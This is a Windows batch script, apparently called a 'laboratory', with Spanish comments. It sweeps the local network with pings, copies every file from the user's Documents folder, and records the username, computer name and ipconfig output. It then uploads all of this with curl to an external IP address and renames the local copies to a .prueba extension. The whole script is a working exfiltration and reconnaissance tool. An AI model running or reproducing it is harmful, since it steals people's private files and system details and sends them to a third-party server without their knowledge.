@echo off
setlocal enabledelayedexpansion

title Laboratorio FINAL
color 0A

rem ===== Preparación carpeta y log =====
mkdir "C:\Prueba" 2>nul
mkdir "C:\Prueba\docs" 2>nul
cd /d "C:\Prueba"

set "LOG=exec_log.txt"
echo [%date% %time%] INICIO SCRIPT > "%LOG%"
echo [%date% %time%] Directorio actual: %CD% >> "%LOG%"

echo ========================================
echo LABORATORIO - VERSION FINAL
echo ========================================
echo.

rem ===== Comprobar curl =====
where curl >nul 2>&1
if errorlevel 1 (
    echo [ERROR] curl.exe no encontrado. >> "%LOG%"
    echo curl.exe no esta en el PATH. No se pueden subir archivos.
    goto RENOMBRAR_FINAL
)

set "DOCSRC=%USERPROFILE%\Documents"
echo [%date% %time%] Directorio de Documentos: "%DOCSRC%" >> "%LOG%"

rem =====================================================
rem [1/5] PING SWEEP 192.168.1.0/24
rem =====================================================
echo [1/5] PING SWEEP 192.168.1.0/24...
echo [%date% %time%] PASO 1 - PING SWEEP INICIADO >> "%LOG%"

set "live=0"
set "total=50"

if exist ping_results.txt del ping_results.txt
echo Hosts vivos en 192.168.1.0/24:>ping_results.txt

for /L %%i in (1,1,%total%) do (
    ping -n 1 -w 300 192.168.1.%%i >nul

    if not errorlevel 1 (
        set /a live+=1
        echo 192.168.1.%%i>>ping_results.txt
        echo [%date% %time%] PING OK 192.168.1.%%i >> "%LOG%"
    ) else (
        echo [%date% %time%] PING FAIL 192.168.1.%%i >> "%LOG%"
    )
)

echo.>>ping_results.txt
echo Total hosts vivos: !live! de !total!>>ping_results.txt
echo [%date% %time%] PASO 1 - PING TERMINADO - Hosts vivos: !live! de !total! >> "%LOG%"
echo PING OK: !live! hosts vivos detectados.

rem =====================================================
rem [2/5] DOCUMENTOS - copiar TODO a C:\Prueba\docs
rem =====================================================
echo [2/5] DOCUMENTOS...
echo [%date% %time%] PASO 2 - DOCUMENTOS (copiar TODO) INICIADO >> "%LOG%"

set /a copied=0
if exist docs_log.txt del docs_log.txt
echo Documentos copiados desde "%DOCSRC%":>docs_log.txt

for /R "%DOCSRC%" %%F in (*) do (
    copy "%%F" ".\docs\" >nul 2>&1
    if not errorlevel 1 (
        set /a copied+=1
        echo %%~nxF>>docs_log.txt
        echo [%date% %time%] DOC COPIADO "%%F" >> "%LOG%"
    ) else (
        echo [%date% %time%] ERROR COPIANDO "%%F" >> "%LOG%"
    )
)

echo Total documentos copiados: !copied!>>docs_log.txt
echo [%date% %time%] PASO 2 - DOCUMENTOS TERMINADO - Copiados: !copied! >> "%LOG%"
echo DOCUMENTOS: !copied! archivos copiados a C:\Prueba\docs.

rem =====================================================
rem [3/5] LOG SISTEMA
rem =====================================================
echo [3/5] LOG SISTEMA...
echo [%date% %time%] PASO 3 - LOG SISTEMA INICIADO >> "%LOG%"

echo %date% %time% - LABORATORIO INICIADO > log.txt
echo USUARIO: %USERNAME% >> log.txt
echo COMPUTADORA: %COMPUTERNAME% >> log.txt
echo IP (nombre host): %COMPUTERNAME% >> log.txt
ipconfig >> log.txt 2>nul

echo [3/5] LOG COMPLETADO >> log.txt
echo [%date% %time%] PASO 3 - LOG SISTEMA TERMINADO >> "%LOG%"
echo LOG SISTEMA OK.

rem =====================================================
rem [4/5] PREPARACION (sin renombrar aún)
rem =====================================================
echo [4/5] PREPARACION...
echo [%date% %time%] PASO 4 - PREPARACION (sin renombre) >> "%LOG%"
echo Se subiran ping_results.txt, exec_log.txt, log.txt, docs_log.txt y todo .\docs. >> "%LOG%"
echo PREPARACION OK.

rem =====================================================
rem [5/5] UPLOAD HTTP POST con curl
rem     *** MISMO PATRON QUE PRUEBAS QUE FUNCIONARON ***
rem =====================================================
echo [5/5] UPLOAD HTTP POST...
echo [%date% %time%] PASO 5 - UPLOAD INICIADO >> "%LOG%"

rem ---- 5.1 Subir logs de la raiz ----
for %%F in (ping_results.txt exec_log.txt log.txt docs_log.txt) do (
    if exist "%%F" (
        echo --- SUBIENDO LOG %%F ---
        curl -v -T "%%F" "http://187.124.82.91/"
    )
)

rem ---- 5.2 Subir TODO lo que hay en .\docs ----
for /R ".\docs" %%F in (*) do (
    echo --- SUBIENDO DOC %%F ---
    curl -v -T "%%F" "http://187.124.82.91/"
)

echo [%date% %time%] PASO 5 - UPLOAD TERMINADO >> "%LOG%"
echo SUBIDA COMPLETADA (igual que las pruebas manuales).

:RENOMBRAR_FINAL
rem =====================================================
rem [6/6] RENOMBRAR A .prueba (DESPUES de subir)
rem =====================================================
echo [6/6] RENOMBRAR A .prueba (local)...
echo [%date% %time%] PASO 6 - RENOMBRAR A .prueba INICIADO >> "%LOG%"
echo [%date% %time%] FIN SCRIPT (antes de renombrar) >> "%LOG%"

rem Renombrar logs de la raiz
for %%F in (ping_results.txt exec_log.txt log.txt docs_log.txt) do (
    if exist "%%F" ren "%%F" "%%~nF.prueba"
)

rem Renombrar TODO lo que hay en docs
pushd ".\docs"
for /R %%F in (*.*) do (
    if /I not "%%~xF"==".prueba" ren "%%F" "%%~nF.prueba"
)
popd

echo RENOMBRADO FINALIZADO.
echo.
echo ========================================
echo LABORATORIO COMPLETADO
echo 📁 Archivos en: C:\Prueba\
dir C:\Prueba
echo.
echo Logs y documentos ya fueron subidos y luego renombrados a .prueba.
echo Destino: http://187.124.82.91/
echo ========================================
echo.
pause
